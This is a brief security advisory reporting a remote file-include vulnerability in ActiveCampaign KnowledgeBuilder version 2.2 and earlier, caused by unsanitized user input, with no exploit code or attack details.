ActiveCampaign KnowledgeBuilder is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.

This may allow an attacker to compromise the application and the underlying system; other attacks are also possible.

Reportedly, version 2.2 and earlier are vulnerable; other versions may also be affected.
